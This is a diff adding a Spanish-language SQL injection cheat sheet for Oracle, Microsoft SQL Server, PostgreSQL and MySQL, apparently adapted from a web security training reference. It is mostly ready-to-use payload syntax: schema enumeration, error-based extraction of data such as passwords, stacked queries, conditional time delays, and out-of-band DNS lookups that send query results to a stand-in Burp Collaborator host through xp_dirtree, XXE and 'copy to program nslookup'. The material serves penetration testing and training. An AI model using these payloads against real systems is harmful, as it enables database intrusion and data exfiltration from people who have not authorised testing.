@@ -1,0 +1,151 @@
+# 🧨 SQL Injection Cheat Sheet
+
+Este cheat sheet contiene ejemplos de sintaxis útil que puedes emplear al realizar ataques de **inyección SQL** para una variedad de tareas comunes durante pruebas de seguridad.
+
+---
+
+## 🔗 String Concatenation
+
+| SGBD         | Sintaxis                                   |
+|--------------|--------------------------------------------|
+| Oracle       | `'foo'||'bar'`                             |
+| Microsoft    | `'foo'+'bar'`                              |
+| PostgreSQL   | `'foo'||'bar'`                             |
+| MySQL        | `'foo' 'bar'` *(nota: espacio entre comillas)*<br>`CONCAT('foo','bar')` |
+
+---
+
+## 🔎 Substring (extraer partes de cadenas)
+
+Extrae parte de una cadena desde un desplazamiento específico:
+
+| SGBD         | Sintaxis                           | Resultado (`ba`) |
+|--------------|------------------------------------|------------------|
+| Oracle       | `SUBSTR('foobar', 4, 2)`           | `ba`             |
+| Microsoft    | `SUBSTRING('foobar', 4, 2)`        | `ba`             |
+| PostgreSQL   | `SUBSTRING('foobar', 4, 2)`        | `ba`             |
+| MySQL        | `SUBSTRING('foobar', 4, 2)`        | `ba`             |
+
+---
+
+## 💬 SQL Comments
+
+| SGBD         | Sintaxis de comentario                       |
+|--------------|----------------------------------------------|
+| Oracle       | `--comment`                                  |
+| Microsoft    | `--comment`, `/*comment*/`                   |
+| PostgreSQL   | `--comment`, `/*comment*/`                   |
+| MySQL        | `#comment`, `-- comment`, `/*comment*/`      |
+
+---
+
+## 🛠️ Obtener Versión de Base de Datos
+
+| SGBD         | Consulta SQL                                   |
+|--------------|------------------------------------------------|
+| Oracle       | `SELECT banner FROM v$version`<br>`SELECT version FROM v$instance` |
+| Microsoft    | `SELECT @@version`                             |
+| PostgreSQL   | `SELECT version()`                             |
+| MySQL        | `SELECT @@version`                             |
+
+---
+
+## 📦 Contenido de la Base de Datos
+
+| SGBD         | Listar tablas y columnas                                      |
+|--------------|---------------------------------------------------------------|
+| Oracle       | `SELECT * FROM all_tables`<br>`SELECT * FROM all_tab_columns WHERE table_name = 'TABLE'` |
+| Microsoft    | `SELECT * FROM information_schema.tables`<br>`SELECT * FROM information_schema.columns WHERE table_name = 'TABLE'` |
+| PostgreSQL   | `SELECT * FROM information_schema.tables`<br>`SELECT * FROM information_schema.columns WHERE table_name = 'TABLE'` |
+| MySQL        | `SELECT * FROM information_schema.tables`<br>`SELECT * FROM information_schema.columns WHERE table_name = 'TABLE'` |
+
+---
+
+## ❗ Errores Condicionales
+
+| SGBD         | Sintaxis condicional que genera error                          |
+|--------------|---------------------------------------------------------------|
+| Oracle       | `SELECT CASE WHEN (CONDICIÓN) THEN TO_CHAR(1/0) ELSE NULL END FROM dual` |
+| Microsoft    | `SELECT CASE WHEN (CONDICIÓN) THEN 1/0 ELSE NULL END`         |
+| PostgreSQL   | `1 = (SELECT CASE WHEN (CONDICIÓN) THEN 1/(SELECT 0) ELSE NULL END)` |
+| MySQL        | `SELECT IF(CONDICIÓN,(SELECT table_name FROM information_schema.tables),'a')` |
+
+---
+
+## 🧪 Exfiltración de Datos vía Errores
+
+| SGBD         | Consulta que filtra datos por mensaje de error                 |
+|--------------|----------------------------------------------------------------|
+| Microsoft    | `SELECT 'foo' WHERE 1 = (SELECT 'secret')`<br>➤ *Conversion failed...* |
+| PostgreSQL   | `SELECT CAST((SELECT password FROM users LIMIT 1) AS int)`<br>➤ *invalid input syntax...* |
+| MySQL        | `SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))`<br>➤ *XPATH syntax error...* |
+
+---
+
+## 🧱 Batched (Stacked) Queries
+
+| SGBD         | Soporte de consultas múltiples                                 |
+|--------------|----------------------------------------------------------------|
+| Oracle       | ❌ No soportado                                                 |
+| Microsoft    | `QUERY1; QUERY2`                                               |
+| PostgreSQL   | `QUERY1; QUERY2`                                               |
+| MySQL        | `QUERY1; QUERY2` *(puede requerir ciertas APIs en PHP/Python)* |
+
+---
+
+## ⏱️ Retrasos de Tiempo (Time Delays)
+
+| SGBD         | Sintaxis de retraso incondicional (10s)                         |
+|--------------|-----------------------------------------------------------------|
+| Oracle       | `dbms_pipe.receive_message(('a'),10)`                           |
+| Microsoft    | `WAITFOR DELAY '0:0:10'`                                        |
+| PostgreSQL   | `SELECT pg_sleep(10)`                                          |
+| MySQL        | `SELECT SLEEP(10)`                                             |
+
+---
+
+## ⏳ Retrasos Condicionales
+
+| SGBD         | Retraso sólo si se cumple una condición                        |
+|--------------|-----------------------------------------------------------------|
+| Oracle       | `SELECT CASE WHEN (COND) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual` |
+| Microsoft    | `IF (COND) WAITFOR DELAY '0:0:10'`                              |
+| PostgreSQL   | `SELECT CASE WHEN (COND) THEN pg_sleep(10) ELSE pg_sleep(0) END` |
+| MySQL        | `SELECT IF(COND,SLEEP(10),'a')`                                |
+
+---
+
+## 🌍 DNS Lookup (con Burp Collaborator)
+
+| SGBD         | DNS lookup para detección remota                               |
+|--------------|-----------------------------------------------------------------|
+| Oracle       | 
+```sql
+SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR/"> %remote;]>'),'/l') FROM dual
+```
+-- o
+SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR')
+| Microsoft    | exec master..xp_dirtree '//BURP-COLLABORATOR/a'              |
+| PostgreSQL   | copy (SELECT '') to program 'nslookup BURP-COLLABORATOR'     |
+| MySQL        | LOAD_FILE('\\\\BURP-COLLABORATOR\\a')SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR\\a' (solo en Windows) |
+---
+
+## Exfiltración DNS con Datos
+| SGBD         | DNS con resultados incluidos en la consulta                     |
+|--------------|-----------------------------------------------------------------|
+| Oracle       | `SELECT EXTRACTVALUE(xmltype('<?xml version="1.0"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR_QUERY)||'.BURP-COLLABORATOR/"> %remote;]>'),'/l') FROM dual`
+| Microsoft    | `DECLARE @p VARCHAR(1024); SET @p=(SELECT YOUR_QUERY); EXEC('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR/a"')`                              |
+| PostgreSQL   | `CREATE OR REPLACE FUNCTION f() RETURNS void AS $$
+DECLARE c TEXT; p TEXT;
+BEGIN
+  SELECT INTO p (SELECT YOUR_QUERY);
+  c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR''';
+  EXECUTE c;
+END;
+$$ LANGUAGE plpgsql SECURITY DEFINER;
+SELECT f();` |
+| MySQL        | `SELECT YOUR_QUERY INTO OUTFILE '\\\\BURP-COLLABORATOR\\a' (Windows only)`                                |
+
+
+
+
